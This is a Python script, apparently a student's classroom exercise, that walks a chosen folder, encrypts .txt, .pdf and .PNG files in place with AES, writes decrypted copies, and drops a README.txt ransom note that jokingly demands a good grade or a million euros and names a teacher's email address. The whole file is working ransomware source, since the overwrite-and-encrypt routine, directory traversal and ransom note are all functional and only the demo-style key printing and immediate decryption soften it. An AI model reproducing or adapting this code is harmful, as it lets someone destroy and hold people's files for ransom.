#definitivo
from Crypto.Cipher import AES
import os

# Generación de clave AES (32 bytes) y vector de inicialización (16 bytes)
key = os.urandom(32)  # Clave AES de 256 bits (32 bytes)
cipher = AES.new(key, AES.MODE_EAX)
iv = cipher.nonce  # Inicialización del vector de 16 bytes

# Función para cifrar y sobrescribir el archivo
def encrypt_and_overwrite_file(key, iv, filename):
    cipher = AES.new(key, AES.MODE_EAX, nonce=iv)
    
    with open(filename, 'rb+') as fh:
        # Leer y cifrar los datos en bloques de 1024 bytes
        data = fh.read(1024)
        while len(data) > 0:
            print(f'\t\t***INFO***[encrypt_and_overwrite_file]: Leído {len(data)} bytes')
            encrypted_data = cipher.encrypt(data)  # Cifrado de los datos
            fh.seek(fh.tell() - len(data))  # Volver al principio del bloque
            fh.write(encrypted_data)  # Sobrescribir el bloque con los datos cifrados
            data = fh.read(1024)  # Leer el siguiente bloque
    
    print(f"\t\tEncrypting File: {filename}")

# Función para descifrar el archivo y guardarlo con el sufijo .decrypt
def decrypt_file(key, iv, filename):
    cipher = AES.new(key, AES.MODE_EAX, nonce=iv)
    enc_file = filename
    dec_file = filename + ".decrypt"
    try:
        with open(enc_file, 'rb') as e_fh, open(dec_file, 'wb') as d_fh:
            data = e_fh.read(1024)  # Leer en bloques de 1024 bytes
            while len(data) > 0:
                print(f'\t\t***INFO***[decrypt_file]: Leído {len(data)} bytes')
                dec_data = cipher.decrypt(data)  # Descifrado de los datos
                d_fh.write(dec_data)  # Escribir los datos descifrados en el archivo nuevo
                data = e_fh.read(1024)  # Leer el siguiente bloque
        
        print(f"\t\tDecrypting File: {filename}")
        print(f"***INFO*** [decrypt_file]: Decrypted File ({dec_file})")
    except:
        print(f'\t\t***ERROR***[decrypt_file]: Cannot open file {enc_file}')

# Función para crear el archivo README.txt con el mensaje de rescate
def ransom_note(ransom_dirs):
    ransom_note = """
    Your files have been encrypted Juanra!
    These are your options:
    Option 1 : 
        Give me a very good grade on the exercise!!
    Option 2 :       
        Deposit one million euros into the following account:
            1234567890
        Once payment has been made, please contact the following email address: jgarciazud@educacion.navarra.es
    Option 3:        
        Stay with ransomware forever
    """
    readme_path = os.path.join(ransom_dirs, "README.txt")
    with open(readme_path, 'w') as f:
        f.write(ransom_note)
    print(f"Ransom note has been created at: {readme_path}")

# Configuración de los directorios y extensiones a cifrar
ransom_dirs = [r"C:\Users\Joseba\Desktop\ramsonware"]  # Añadir más directorios si es necesario
ransom_exts = [".txt", ".pdf", ".PNG"]  # Extensiones de los archivos a cifrar

# Paso 1: Mostrar información general
print("\033[33m***STEP 1***\033[0m")
print(f"This Ransomware will walk through the directories: {ransom_dirs}")
print(f"This Ransomware will encrypt ALL FILES with extensions {ransom_exts}\n")

# Paso 2: Mostrar la clave y el IV utilizados
print("\033[33m***STEP 2***\033[0m")
print("The Ransomware will use the following AES Encryption Key (32 bytes):")
print(f"{key}")
print("The Ransomware will use the following Initialization Vector (16 bytes):")
print(f"{iv}\n")

# Paso 3: Recorrer los directorios y cifrar los archivos
print("\033[33m***STEP 3***\033[0m")
print("The Ransomware will walk through the File System encrypting all target files")
for ransom_dir in ransom_dirs:
    print(f"\nWalking through the {ransom_dir} Directory to find {ransom_exts} files")
    for root, dirs, files in os.walk(ransom_dir):
        print(f"\n\tDirectory: {root}")
        for f in files:
            for ext in ransom_exts:
                if f.endswith(ext):
                    filename = os.path.join(root, f)
                    print(f"\t\tEncrypting File: {filename}")
                    encrypt_and_overwrite_file(key, iv, filename)  # Llamada para cifrar
                    print(f"\t\tDencrypting File: {filename}")
                    decrypt_file(key, iv, filename)  # Llamada para descifrar
        ransom_note(ransom_dirs)  # Crear la nota de rescate en el directorio

input("\033[33mPress any key to finish \033[0m")